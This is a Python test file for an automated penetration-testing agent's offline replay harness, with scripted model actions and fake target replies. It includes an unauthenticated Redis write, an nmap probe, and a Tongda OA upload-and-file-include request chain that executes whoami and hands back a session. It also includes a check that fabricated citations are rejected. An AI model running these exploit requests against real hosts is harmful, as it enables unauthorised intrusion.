"""离线回放：把"卡 + 模型输出"钉住，只让**衔接代码**受测（爷爷 2026-10-07 的口径）。

爷爷原话："正常模型有效的输出，是长什么样子都是固定的。那暂时不用真跑靶场呀，只要看模型的输出
对不对，就知道每个节点能不能完成了呀。快速的测试，全过了，再去真机跑不好吗？"
—— 所以这里不用靶场：每个节点给一份**剧本**（模型该发的几发 + 那个世界该回什么），
跑真卡、真实执行器、真判据。全绿再去真机 —— 那时出问题就只可能是衔接代码。

剧本三件套：
* `actions`：模型按顺序该发的动作（与真跑时模型输出同形，含 `tool`/`cmd`/`code`/`http`）；
* `world`：假世界（argv 里出现某个词 → 回什么）。回执里要含 `finish` 打算引的那几句；
* 断言：收尾是 `model_reported` + `pass`，引文全部核对通过，且**一次拒绝都没有**
  （有拒绝就说明卡与模型输出对不上，那是"卡的问题"，不是衔接的问题）。
"""

import base64
import json
import re
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
for extra in (ROOT / "src", ROOT / "scripts"):
    if str(extra) not in sys.path:
        sys.path.insert(0, str(extra))

import run_lean_task  # noqa: E402
from runtime import channels  # noqa: E402
from runtime.runner import ExecOutcome  # noqa: E402
from skills.lean import load_card  # noqa: E402


def card_by_id(card_id):
    """按 id 从 skills/ 里找那张卡（离线回放跑的是**真卡**，不是复制的副本）。"""
    for path in sorted((ROOT / "skills").glob("*/SKILL.md")):
        text = path.read_text(encoding="utf-8")
        if re.search(r"^id: %s$" % re.escape(card_id), text, re.M):
            return load_card(card_id)                   # load_card 收的是卡 id（`域.名字`）
    raise AssertionError("没有这张卡：" + card_id)


class World:
    """假世界：按 argv 里的关键词回一份"目标会说的话"，并**带上运行时的标记包**。

    标记必须回：运行时的"括号齐了"判据认它（`<marker>start` … `<marker>end <rc>`）。
    """

    def __init__(self, rules, default="ok\n"):
        self.rules, self.default, self.calls, self.replies = list(rules), default, [], []

    def __call__(self, argv, timeout):
        text = " ".join(str(part) for part in argv)
        self.calls.append(text)
        # http body is base64(JSON): decode it so rules and the marker are visible.
        decoded_text = ""
        for part in argv:
            token = str(part)
            if len(token) >= 40 and re.fullmatch(r"[A-Za-z0-9+/=]+", token):
                try:
                    decoded_text += " " + base64.b64decode(
                        token + "=" * (-len(token) % 4)).decode("utf-8", "replace")
                except Exception:  # noqa: BLE001 - not base64, skip
                    continue
        haystack = text + " " + decoded_text
        found = re.search(r"(agv[0-9a-z]{4,})start", haystack)
        if not found:
            #: http 那条路：请求里带的是标记**本体**（`agvXXXX`），"start" 是客户端自己加的。
            found = re.search(r'"marker"\s*:\s*"(agv[0-9a-z]{4,})"', haystack)
        marker = found.group(1) if found else ""
        reply = next((item for needle, item in self.rules if needle in haystack), self.default)
        self.replies.append(reply)
        if not marker:
            return ExecOutcome(0, reply, "")
        body = "%sstart\n%s\n%send 0\n" % (marker, reply.rstrip("\n"), marker)
        return ExecOutcome(0, body, "")


def replay(tmp_path, card_id, *, task, scope, actions, world, max_steps=12):
    card = card_by_id(card_id)
    executor = World(world)
    #: 作用域要**同时**给两处：`task["scope"]`（`validate_task` 从任务里读它）
    #: 与 `drive(scope=…)`（运行时用它核对执行位置）。
    task = dict(task, scope=dict(scope))
    result = run_lean_task.drive(card, task, scope, executor, client=None,
                                 run_dir=tmp_path / "lane", python="/usr/bin/python3",
                                 timeout=5.0, max_steps=max_steps, actions=actions,
                                 private_result=True)
    log = tmp_path / "lane" / "events.jsonl"
    events = ([line for line in log.read_text(encoding="utf-8").splitlines() if line.strip()]
              if log.exists() else [])
    #: 每次回放都把"结论 + 逐发事件"留一份到 tmp/ 下（出事时不用重现，直接看）——爷爷的排查习惯。
    report = tmp_path / "replay.json"
    report.write_text(json.dumps({"card": card_id, "result": result, "events": events,
                                   "calls": executor.calls, "replies": executor.replies},
                                  ensure_ascii=False, indent=2), encoding="utf-8", newline="\n")
    return result, executor, events


BASE_SCOPE = {"host": "192.168.52.10", "port": 6379, "protocol": "tcp", "vantage": "base",
              "resources": "whole_endpoint"}


def test_node_12_redis_unauth_write_replays_green(tmp_path):
    """node 12 剧本：PING → SET → GET 三发证明"没凭据也能写"，然后收尾引用那三发。

    这一格在真机上已经跑过很多轮（12 是每轮都成的那一批）；离线把它钉住，是为了**以后改衔接
    代码时立刻知道有没有把这一格带坏**。
    """
    actions = [
        {"tool": "cmd", "cmd": "redis-cli -h 192.168.52.10 -p 6379 PING"},
        {"tool": "cmd", "cmd": "redis-cli -h 192.168.52.10 -p 6379 SET agv_probe_12 agv_val_12"},
        {"tool": "cmd", "cmd": "redis-cli -h 192.168.52.10 -p 6379 GET agv_probe_12"},
        {"kind": "finish", "claim": "redis 未授权：PING 通、无凭据写入并读回 agv_val_12",
         "claimed_verdict": "pass",
         "citations": [{"quote": "PONG"}, {"quote": "OK"}, {"quote": "agv_val_12"}]},
    ]
    world = [("PING", "PONG"), ("SET agv_probe_12", "OK"), ("GET agv_probe_12", "agv_val_12")]
    result, executor, events = replay(
        tmp_path, "exploit.redis_unauth_write",
        task={"node_id": "12", "goal": "redis 未授权写入",
              "inputs": {"target_host": "192.168.52.10"}},
        scope=BASE_SCOPE, actions=actions, world=world)
    assert result["status"] == "model_reported", (result, events[:4])
    assert result.get("claimed_verdict") == "pass", result
    assert not result.get("rejections"), result.get("rejections")
    assert len(executor.calls) == 3, executor.calls


def test_node_14_tcp_probe_replays_green(tmp_path):
    """node 14 剧本：一次 nmap 探活 + 引用它的回执 —— 最简的一格，用来盯住"探活类"的衔接。"""
    actions = [
        {"tool": "tool", "name": "nmap", "args": ["-Pn", "-n", "-sT", "-p", "445", "192.168.93.40"]},
        {"kind": "finish", "claim": "445 从本位置可达（开放）", "claimed_verdict": "pass",
         "citations": [{"quote": "445/tcp open  microsoft-ds"}]},
    ]
    result, executor, events = replay(
        tmp_path, "pre.nmap_tcp_probe",
        task={"node_id": "14", "goal": "TCP 可达性",
              "inputs": {"target_host": "192.168.93.40", "port": "445", "protocol": "tcp"}},
        scope={"host": "192.168.93.40", "port": 445, "protocol": "tcp", "vantage": "base",
               "resources": "whole_endpoint"},
        actions=actions, world=[("nmap", "445/tcp open  microsoft-ds")])
    assert result["status"] == "model_reported", (result, events[:4])
    assert result.get("claimed_verdict") == "pass", result
    assert not result.get("rejections"), result.get("rejections")


def test_node_7_tongda_include_chain_replays_green(tmp_path):
    """node 7 剧本：拿会话 → 上传载荷 → 包含执行 → 交付会话，四发 + 引用四句。

    这一格是这一晚最贵的：引文判死过三次（脱敏 / 空白 / 转义），交付还卡过假阳性。
    离线把它钉住：以后动引文、动 http 客户端、动 stage，立刻知道有没有把它带坏。
    """
    target = "http://192.168.52.30:8080"
    actions = [
        {"tool": "http", "method": "GET", "path": "/"},
        {"tool": "http", "method": "POST", "path": "/logincheck_code.php",
         "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "UID=1"},
        {"tool": "http", "method": "POST", "path": "/ispirit/im/upload.php",
         "headers": {"Content-Type": "multipart/form-data; boundary=agvboundary"},
         "body": "--agvboundary\r\nContent-Disposition: form-data; name=\"P\"\r\n\r\n1\r\n"
                 "--agvboundary--\r\n"},
        {"tool": "http", "method": "GET",
         "path": "/ispirit/interface/gateway.php?json=%7B%22url%22%3A%22%2Fgeneral%2F..%2Fattach"
                 "%2Fim%2F2610%2F1.agv.png%22%7D&cmd=whoami"},
        {"tool": "http", "method": "GET",
         "path": "/ispirit/interface/gateway.php?json=%7B%22url%22%3A%22%2Fgeneral%2F..%2Fattach"
                 "%2Fim%2F2610%2F1.agv.png%22%7D&cmd=echo+delivery"},
        {"kind": "finish", "claim": "通达包含链取得回显并交付会话",
         "claimed_verdict": "pass",
         "citations": [{"quote": '{"status":1,"msg":"","url":"general\\/index.php?isIE=0"}'},
                       {"quote": "+OK [vm]460@2610_1|agv.png|0[/vm]"},
                       {"quote": "nt authority\\system"},
                       {"quote": "AGV_SESSION_LAUNCHED"}]},
    ]
    world = [
        ("/logincheck_code.php", '{"status":1,"msg":"","url":"general\\/index.php?isIE=0"}'),
        ("/ispirit/im/upload.php", "+OK [vm]460@2610_1|agv.png|0[/vm]"),
        ("cmd=whoami", "nt authority\\system"),
        ("cmd=echo+delivery", "AGV_SESSION_LAUNCHED"),
    ]
    result, executor, events = replay(
        tmp_path, "exploit.tongda_oa_include_rce",
        task={"node_id": "7", "goal": "通达 OA 文件包含 → 命令执行",
              "inputs": {"target_url": target,
                         "delivery_command": "echo delivery",
                         "must_deliver_session": "把会话交回来"}},
        scope={"host": "192.168.52.30", "port": 8080, "protocol": "tcp", "vantage": "base",
               "resources": "whole_endpoint"},
        actions=actions, world=world)
    assert result["status"] == "model_reported", (result, events[:6])
    assert result.get("claimed_verdict") == "pass", (result, events[-3:])
    assert not result.get("rejections"), result.get("rejections")
    assert len(executor.calls) == 5, executor.calls


def test_the_replay_harness_notices_a_fabricated_citation(tmp_path):
    """回放也要能抓"编引文"：世界没回过的句子，收尾引它 → 必须被判引文无效。

    2026-10-07 walk-84/85 node 7：模型把卡里的示例当成观测抄了。离线这一格就是那道闸的守线。
    """
    actions = [
        {"tool": "cmd", "cmd": "redis-cli -h 192.168.52.10 -p 6379 PING"},
        {"kind": "finish", "claim": "我用卡里的示例当观测", "claimed_verdict": "pass",
         "citations": [{"quote": "{\"status\":1,\"msg\":\"\",\"url\":\"general/index.php\"}"}]},
    ]
    result, _executor, events = replay(
        tmp_path, "exploit.redis_unauth_write",
        task={"node_id": "12", "goal": "redis 未授权写入",
              "inputs": {"target_host": "192.168.52.10"}},
        scope=BASE_SCOPE, actions=actions, world=[("PING", "PONG")])
    assert result["status"] != "model_reported", result
    joined = "\n".join(events)
    assert "LEAN_CITATION" in joined, "编出来的引文必须当场被判无效"
    assert "correction" in joined, "而且要回喂一次（告诉它该抄哪段）"
class Transcript:
    """`ExecutorLike`：按**调用顺序**把真跑时的那份回执原样喂回去（只把标记换成本次的）。

    这就是"回放一次真跑"：动作来自当时模型的原话，回执来自当时的账本 —— 复核的是
    **卡 + 执行器 + 判据**这条链，不碰靶场。标记必须换：运行时每发都新生成一个，旧标记不被认。
    """

    def __init__(self, receipts, actions=None):
        self.receipts, self.index, self.calls = list(receipts), 0, []
        self.mapping, self.actions = {}, list(actions or [])

    def _remap(self, value):
        """把**旧标记**换成本次的：回执和模型引文里都可能有它（引文常直接引标记包里的原话）。"""
        if isinstance(value, str):
            for old, fresh in self.mapping.items():
                value = value.replace(old, fresh)
            return value
        if isinstance(value, list):
            return [self._remap(item) for item in value]
        if isinstance(value, dict):
            return {key: self._remap(item) for key, item in value.items()}
        return value

    def _rewrite_actions(self):
        for index, action in enumerate(self.actions):
            self.actions[index] = self._remap(action)

    def __call__(self, argv, timeout):
        text = " ".join(str(part) for part in argv)
        self.calls.append(text)
        fresh = ""
        #: http 那条路的请求是 base64(JSON)：先解出来，才看得到本次的标记（否则标记换不掉，
        #: 运行时会认为这一发"没到过"）。
        haystack = text
        for part in argv:
            token = str(part)
            if len(token) >= 40 and re.fullmatch(r"[A-Za-z0-9+/=]+", token):
                try:
                    haystack += " " + base64.b64decode(
                        token + "=" * (-len(token) % 4)).decode("utf-8", "replace")
                except Exception:                       # noqa: BLE001 - 不是 base64 就跳过
                    continue
        found = re.search(r"(agv[0-9a-z]{4,})start", haystack) or re.search(
            r'"marker"\s*:\s*"(agv[0-9a-z]{4,})"', haystack)
        if found:
            fresh = found.group(1)
        body = self.receipts[self.index] if self.index < len(self.receipts) else ""
        self.index += 1
        old = re.search(r"(agv[0-9a-z]{4,})start", body)
        if fresh and old:
            self.mapping[old.group(1)] = fresh
            body = body.replace(old.group(1), fresh)
            #: 引文里也引了那条标记行的话，必须跟着换 —— 否则回放会栽在"引文对不上"上
            #: （node 7/28 实测：它们引的正是标记包里的原话）。
            self._rewrite_actions()
        return ExecOutcome(0, body, "")


REPLAY_DIR = ROOT / "tests" / "replays"
HARVESTED = sorted(REPLAY_DIR.glob("node*.json")) if REPLAY_DIR.exists() else []


@pytest.mark.parametrize("path", HARVESTED, ids=lambda item: item.stem)
def test_a_harvested_node_replays_green(tmp_path, path, monkeypatch):
    """**每一次真跑都变成一条离线用例**：从记录里收割的动作 + 回执，离线重放一遍必须全绿。

    这一条守的是"改衔接不许把已经跑通的格带坏"（爷爷 2026-10-07 的原话：改了 A 要知道会不会影响 B）。
    剧本是 `tmp/harvest_replay.py` 从真跑记录里收的，不是手写的。
    """
    fixture = json.loads(path.read_text(encoding="utf-8"))
    card = card_by_id(fixture["card"])
    scope = dict(fixture.get("scope") or {})
    task = dict(fixture["task"], scope=scope)
    channel = None
    if scope.get("resources") == "execution_position" and scope.get("carrier"):
        #: 位置作用域要求"执行器真的绑在那条通道上"。回放里用一条**合成通道行**满足这条检查，
        #: 同时把载体本身接到回执剧本上（否则真去连控制台了）。
        channel = {"channel_id": str(scope["carrier"]), "kind": "console_session",
                   "session_id": "replay", "session_type": "meterpreter",
                   "endpoint": {"host": "127.0.0.1", "port": 55553, "ssl": False},
                   "platform": task["inputs"]["position_platform"],
                   "capacity": {"max_bytes": 65536, "source": "offline replay payload declaration"},
                   "shell_ready": True, "host": str(scope.get("host") or "")}
        transcript = Transcript(fixture["receipts"], fixture["actions"])
        def console_call(row, action, timeout):
            from runtime.runner import observe_marker_frame
            outcome = transcript([action["text"]], timeout)
            completion = action["completion"]
            complete = bool(completion and observe_marker_frame(
                outcome.stdout, completion["marker"])[0])
            return ExecOutcome(outcome.returncode if complete else None,
                               outcome.stdout, outcome.stderr, not complete,
                               outcome.tool_error, "end_marker" if complete else "deadline")

        monkeypatch.setattr(channels, "console_call", console_call)
    else:
        transcript = Transcript(fixture["receipts"], fixture["actions"])
    result = run_lean_task.drive(card, task, dict(fixture.get("scope") or {}),
                                 transcript, client=None,
                                 run_dir=tmp_path / "lane", python="/usr/bin/python3",
                                 timeout=5.0, max_steps=14, actions=fixture["actions"],
                                 channel=channel, private_result=True)
    assert result.get("status") == "model_reported", (fixture["node"], result)
    assert result.get("claimed_verdict") == "pass", (fixture["node"], result)
    assert not result.get("rejections"), (fixture["node"], result.get("rejections"))
